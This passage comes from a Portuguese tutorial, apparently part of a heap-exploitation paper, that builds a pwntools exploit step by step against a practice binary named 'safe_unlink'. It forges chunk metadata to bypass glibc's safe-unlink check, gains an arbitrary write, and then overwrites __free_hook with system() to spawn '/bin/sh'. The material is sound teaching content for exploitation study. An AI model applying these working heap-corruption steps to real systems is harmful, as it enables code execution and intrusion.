<p>Como este binário foi compilado sem o <code class="language-plaintext highlighter-rouge">PIE</code>, sabemos o exato endereço da <code class="language-plaintext highlighter-rouge">m_array</code> em tempo de execução.</p>

<p>Entendemos que uma forma de passar pela checagem do <em>safe unlink</em> é utilizar <em>pointers</em> para o <em>chunk</em> que está sendo desvinculado, e a <code class="language-plaintext highlighter-rouge">m_array</code> nos dá um <em>pointer</em> para este <em>chunk</em>.<br />
Se forjarmos nossos “fd” e “bk” de forma que este <em>pointer</em> na <code class="language-plaintext highlighter-rouge">m_array</code> se torne ambos, “fd” do <em>chunk</em> apontado pelo nosso “fd” e o “bk” desse <em>chunk</em> apontado pelo nosso “bk”, conseguiremos passar pelo <em>safe unlink</em>.</p>

<p>Além disso, nossa escrita refletida, sobrescreverá a entrada do <code class="language-plaintext highlighter-rouge">m_array</code> com nosso “fd” forjado, que será seu próprio endereço, menos 24.<br />
Uma vez que isso aconteça, a opção <code class="language-plaintext highlighter-rouge">edit</code> do binário, pode ser usada para sobrescrever a <code class="language-plaintext highlighter-rouge">m_array</code> com mais controle, levando a uma escrita arbitrária no binário.</p>

<p>Para colocar em ordem todos os movimentos necessários, vamos criar o script <code class="language-plaintext highlighter-rouge">arbitrary_write.py</code> para iniciar a exploração. O modelo inicial do script fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># configurando o binario e a GLIBC
</span><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"safe_unlink"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">runpath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"/libc.so.6"</span><span class="p">)</span> <span class="c1"># elf.libc broke again
</span>
<span class="c1"># GDB config
</span><span class="n">gs</span> <span class="o">=</span> <span class="s">'''
continue
'''</span>

<span class="c1"># funcao para iniciar
</span><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="c1"># indice do chunk alocado
</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># seleciona a funcao "malloc", envia o tamanho e os dados e retorna o indice do chunk
</span><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">index</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"size: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>

<span class="c1"># seleciona a funcao "edit" e envia os dados para o chunk.
</span><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="c1"># seleciona a opcao "free" e envia o indice.
</span><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"index: "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># capturando o endereco da puts() que o binario vaza
</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"puts() @ "</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">puts</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.1</span>

<span class="c1">#===============EXPLOITING================#
</span>

<span class="c1">#=========================================#
</span>
<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Este script, assim como os demais contém funções auxiliares para iterar entre as opções do menu do binário.
Para iniciar o bloco de exploração, vamos iniciar solicitando dois <em>chunks</em>, “A” e “B”. Depois podemos forjar um “fd” com o endereço da <code class="language-plaintext highlighter-rouge">m_array - 24</code>, assim a malloc vai pensar que o “bk” do <em>chunk</em> estará lá, como este endereço é um <em>quadword</em> de alinhamento, a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> será considerada um “fd”.<br />
Faremos a mesma coisa com a “bk” forjada, apontando para <code class="language-plaintext highlighter-rouge">m_array - 16</code> que também é um <em>quadword</em> de alinhamento, fazendo a primeira entrada da <code class="language-plaintext highlighter-rouge">m_arrray</code> ser considerada o “fd” do <em>chunk</em> falso. O bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x70</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com as edições feitas, podemos executar nosso script com as opções do GDB, pausar e checar a <em>heap</em> e a <code class="language-plaintext highlighter-rouge">m_array</code>, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_223.png" alt="Chunk forjado" /></p>

<p>Podemos ver que a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> aponta para o endereço do <em>user data</em> do <em>chunk</em> A, conforme o comportamento normal do programa, marcado em vermelho.<br />
Nossa “fd” forjada aponta para um <em>quadword</em> de alinhamento, marcado em azul, fazendo com que a instrução seja passada até a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, fazendo com que a “bk” do <em>chunk</em> falso, aponte de volta para o <em>chunk</em> A.<br />
Isso completa a primeira parte do processo de checagem do <em>safe unlinking</em>.<br />
Nossa “bk” forjada também aponta para um <em>quadword</em> de alinhamento, marcado em verde, que fará com que a execução passe por ele e considere a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> como sendo válida, e também aponta para o endereço do <em>chunk</em> A, tornando o “fd” do chunk falso, válido.<br />
Isso completa o processo de checagem do <em>safe unlinking</em>.</p>

<p>Porém se continuarmos a execução do programa e tentarmos liberar o <em>chunk</em> B, receberemos uma mensagem de erro, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_224.png" alt="Mensagem de erro" /></p>

<p>Isso acontece, pois algo importante não foi levado em consideração. A malloc lida com <em>chunks</em> utilizando <em>metadata pointers</em>, e não <em>pointes</em> para o <em>user data</em> conforme fizemos. Nossos “fk” e “bk” forjados, apontam para o campo <em>user data</em>, ou seja, 16 bytes após o campo com os metadados, necessários para passar pela checagem. Podemos ver no <em>frame unlink chunk</em> que a última chamada feita por esta função foi feita logo após a checagem, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_225.png" alt="Metadados inválidos" /></p>

<p>Para contornar esta falha, primeiro temos que relembrar como a malloc liberou o <em>chunk</em> A. Nós forjamos um <code class="language-plaintext highlighter-rouge">prev_size field</code> no <em>chunk</em> B, para levar a malloc até o início do <em>chunk</em> A adicionando em seu valor <code class="language-plaintext highlighter-rouge">0x90</code> bytes.</p>

<p>Isso significa que podemos forjar esse <code class="language-plaintext highlighter-rouge">prev_size field</code> para convencer a malloc de que nosso <em>chunk</em> A se inicia no endereço em que está o seu <em>user data</em>. Para isso, podemos subtrair 16 bytes do campo forjado. Mas, isto também vai exigir novas alterações na estrutura do <em>chunk</em> que será liberado, de forma que vamos “construir” um <em>chunk</em>. Em ordem, precisamos:</p>

<ol>
  <li>Subtrair 16 bytes do <code class="language-plaintext highlighter-rouge">prev_size field</code> para forçar a malloc a considerar o campo <em>user data</em> como sendo o início do chunk.</li>
  <li>Adicionar um <em>quadword</em> nulo como <code class="language-plaintext highlighter-rouge">prev_size</code> para indicarmos que o <em>chunk</em> anterior, que não existe, está em uso.</li>
  <li>Criar um <em>size field</em> falso para o <em>chunk</em> que estamos construindo, porém, como vamos construir o <em>chunk</em> dentro de um já existente de <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, precisamos ajustar seu tamanho para <code class="language-plaintext highlighter-rouge">0x80</code> bytes (<code class="language-plaintext highlighter-rouge">0x90</code> menos 16 bytes).</li>
  <li>Por último, precisamos diminuir a quantidade de lixo enviado para o <em>chunk</em> afim de alinharmos o decremento de 16 bytes.</li>
</ol>

<p>Para fins de comparação, a linha de código anterior ficará disponível no bloco de exploração, porém comentada conforme abaixo:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Ao executar o script com as opções do GDB, podemos consultar o que a malloc vê quando segue o “fd” com uma chamada para sua estrutura, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_226.png" alt="Chunk construído" /></p>

<p>Como podemos observar, o “bk” do <em>chunk</em> para o qual estamos apontando, aponta de volta para o início do nosso <em>chunk</em> construído, o que é suficiente para passar pela primeira parte da checagem do <em>safe unlinking</em>.<br />
Seguindo nosso “bk” forjado, vemos que o “fd” do <em>chunk</em> para o qual fomos direcionados, também aponta de volta para nosso <em>chunk</em> construído, o que é suficiente para passar pela segunda parte da checagem do <em>safe unlinking</em>.</p>

<blockquote>
  <p>A linha de código <code class="language-plaintext highlighter-rouge">((struct malloc_chunk*)0x603010).fd</code> simplesmente trata nosso <em>chunk</em> falso como uma estrutura da <code class="language-plaintext highlighter-rouge">malloc_chunk</code> e segue seu “fd”</p>
</blockquote>

<p>Agora, quando liberamos o <em>chunk</em> B, não recebemos nenhuma mensagem de erro, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_227.png" alt="Liberando o chunk B" /></p>

<p>Agora podemos voltar ao GDB e consultar a <em>heap</em>, porém, como ela está corrompida, o comando <code class="language-plaintext highlighter-rouge">vis</code> não vai mostrar o que precisamos, em seu lugar, podemos usar o <code class="language-plaintext highlighter-rouge">dq</code>, para consultarmos o início da <em>heap</em>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_228.png" alt="Heap" /></p>

<p>O comando <code class="language-plaintext highlighter-rouge">top_chunk</code> nos mostra que o <em>chunk</em> B foi consolidado não só com nosso <em>chunk</em> construído, mas também com o <em>top chunk</em>. E como nosso <em>chunk</em> construído foi consolidado, ele também sofreu o processo de <em>unlinking</em>, o que significa que conseguimos a escrita refletida.</p>

<p>Extraindo o <em>dump</em> da memória ao redor da <code class="language-plaintext highlighter-rouge">m_array</code> podemos ver que a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> não aponta mais para a <em>heap</em>, mas para o endereço 24 bytes antes dela própria, conforma mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_229.png" alt="m_array sobrescrita" /></p>

<p>Isto conclui a segunda parte do processo de <em>unlinking</em>, no qual nosso “bk” forjado foi seguido, e nosso “fd” forjado sobrescreveu o “fd” no destino. Podemos confirmar isso, comparando o <em>dump</em> da <em>heap</em> com o <em>dump</em> da <code class="language-plaintext highlighter-rouge">m_array</code>, onde vemos que a primeira entrada do <code class="language-plaintext highlighter-rouge">m_array</code> é idêntica ao nosso “fd”, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_230.png" alt="Fd e m_array idênticas" /></p>

<p>Agora se editarmos o <em>chunk</em> de índice zero, estaremos editando a própria <code class="language-plaintext highlighter-rouge">m_array</code> pela segunda vez com nossos próprios dados.</p>

<p>A partir de agora, seguindo nosso fluxo de alterações, para conseguirmos uma escrita arbitrária no binário, precisamos adicionar os seguintes comandos ao nosso script:</p>

<ol>
  <li>Temos que liberar o <em>chunk</em> B da mesma forma que fizemos manualmente, ativando a consolidação do nosso <em>chunk</em> construído e o desvinculando.</li>
  <li>Neste ponto, o índice zero aponta para três <em>quadwords</em> antes da primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, então, podemos utilizar a função <code class="language-plaintext highlighter-rouge">edit()</code> do nosso script para enviar os três <em>quadwords</em> nulos seguidos do endereço que queremos chegar, neste caso, o endereço da <em>target</em>.</li>
  <li>Agora a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code> aponta para a <em>target</em> e podemos usar a função <code class="language-plaintext highlighter-rouge">edit()</code> novamente no índice zero e sobrescrever o conteúdo da <em>target</em>.</li>
</ol>

<p>O resultado do bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># liberando o chunkB e ativando o unlinking dos chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a primeira entrada do m_array com o endereco da target
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">target</span><span class="p">))</span>

<span class="c1"># sobrescrevendo o conteudo da target
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"BecoXPL"</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Agora executando nosso script e selecionando a opção quatro do menu do binário, comprovamos a escrita arbitrária, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_231.png" alt="Escrita arbitrária" /></p>

<blockquote>
  <p>Em resumo, requisitamos dois <em>chunks</em>, “A” e “B” e aproveitamos da vulnerabilidade de <em>overflow</em> no binário para retirar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> no <em>chunk</em> B.<br />
Também construímos um <em>chunk</em> falso sobre o <em>chunk</em> A, incluindo todos os seus campos, como <code class="language-plaintext highlighter-rouge">size field</code>, “fd” e “bk” e um <code class="language-plaintext highlighter-rouge">prev_size</code>.<br />
Quando liberamos o <em>chunk</em> B, a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> inexistente indicou para a malloc que o <em>chunk</em> A não estava em uso, mesmo que não estivesse, o tornando um candidato a consolidação.<br />
A malloc utilizou o <code class="language-plaintext highlighter-rouge">prev_size field</code> do <em>chunk</em> B para encontrar o início do <em>chunk</em> A para efetuar a consolidação.<br />
Configuramos o <code class="language-plaintext highlighter-rouge">prev_size field</code> do <em>chunk</em> B com o tamanho do <em>chunk</em> A, menos 16, fazendo a malloc acreditar que o <em>chunk</em> A se iniciava no primeiro <em>quadword</em> do <em>user data</em> onde forjamos os metadados do <em>chunk</em> construído.<br />
A malloc então realizou o processo de checagem do <em>safe unlink</em> em nosso <em>chunk</em> construído. Primeiro ela seguiu nosso “fd” e checou que o “bk” do destino apontava de volta para nosso <em>chunk</em> construído. Fizemos o <em>bypass</em> dessa checagem alinhando nosso endereço de “fd” 24 bytes antes da primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, fazendo com que o primeiro endereço válido fosse sua primeira entrada, que apontava de volta para nosso <em>chunk</em> construído.<br />
Depois a malloc seguiu nosso “bk” e performou a mesma checagem na “fd” da <code class="language-plaintext highlighter-rouge">m_array</code>. Fizemos o <em>bypass</em> desta checagem com a mesma técnica utilizada na primeira parte, alinhamos nosso “bk” 16 bytes antes da primeira entrada da <code class="language-plaintext highlighter-rouge">m-array</code>, fazendo com que o primeiro endereço válido fosse sua primeira entrada, que apontava de volta para nosso <em>chunk</em> construído.<br />
Uma vez que nosso <em>chunk</em> construído passou pela checagem do <em>safe unlink</em> ele foi desvinculado.<br />
Isso fez com que o <em>pointer</em> para nosso <em>chunk</em> falso, apontasse para seu próprio endereço, menos 24 bytes.<br />
Como o programa utiliza este <em>pointer</em> para gravar operações que controlamos, fomos capazes de sobrescrever este endereço novamente, com o endereço da nossa <em>target</em>, nos permitindo finalmente sobrescrevê-la.</p>
</blockquote>

<h3 id="execução-de-código-via-safe-unlink">Execução de código via Safe Unlink</h3>

<p>Agora que fomos capazes de realizar escrita arbitrária com a técnica <code class="language-plaintext highlighter-rouge">Safe Unlink</code>, podemos nos aproveitar da vulnerabbilidade para conseguir execução de código, em nosso caso, obter um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Aproveitando o script anterior, podemos alterar o endereço da <code class="language-plaintext highlighter-rouge">m_array</code> na edição do <em>chunk</em> de índice zero, para o endereço da <code class="language-plaintext highlighter-rouge">free hook</code>, de forma parecida com o que fizemos nas outras técnicas.</p>

<p>Desta forma, a próxima vez que tentarmos editar o <em>chunk</em> no índice zero, vamos sobrescrever a <code class="language-plaintext highlighter-rouge">free hook</code>, que podemos substituir com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code>.<br />
O únco problema disso, é que quando liberarmos o único <em>chunk</em> que podemos, no índicce zero, o seu <em>pointer</em> será o endereço da <code class="language-plaintext highlighter-rouge">free hook</code>, onde não poderems escrever nossa <em>string</em> “/bin/sh”.</p>

<p>Poderíamos utilizar o one_gadget, porém existe uma forma mais simples. Ao invés de substituir o endereço da <code class="language-plaintext highlighter-rouge">m_array</code> com o endereço da <code class="language-plaintext highlighter-rouge">free hook</code>, poderiamos substituir pelo endereço da <code class="language-plaintext highlighter-rouge">free hook</code> menos 8 bytes.<br />
Desta forma, poderíamos escrever nossa <em>string</em> “/bin/sh” exatamente um <em>quadword</em> antes da <code class="language-plaintext highlighter-rouge">free hook</code>, seguido do endereço da função <code class="language-plaintext highlighter-rouge">system()</code>. Assim, esta <em>string</em> estará presente em um <em>quadword</em> antes da <code class="language-plaintext highlighter-rouge">system()</code>, se tornando o comando <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>. Vamos fazer estas alterações no mesmo script utilizado para escrita arbitrária, cujo bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># liberando o chunkB e ativando o unlinking dos chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a primeira entrada do m_array com o endereco da free hook - 8 bytes
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>

<span class="c1"># sobrescrevendo o conteudo do endereco com a string "/bin/sh" seguido do endereco da system()
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Com o script pronto, podemos executá-lo com as opções do GDB, e visualizar a <code class="language-plaintext highlighter-rouge">__free_hook</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_232.png" alt="Free hook apontando para system()" /></p>

<p>Conforme podemos observar, neste momento a <code class="language-plaintext highlighter-rouge">free hook</code> foi sobrescrita com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code>. Se consultarmos a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, que ainda não foi liberada, veremos que ela aponta para a <em>string</em> “/bin/sh*, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_233.png" alt="m_array apontando para &quot;/bin/sh&quot;" /></p>

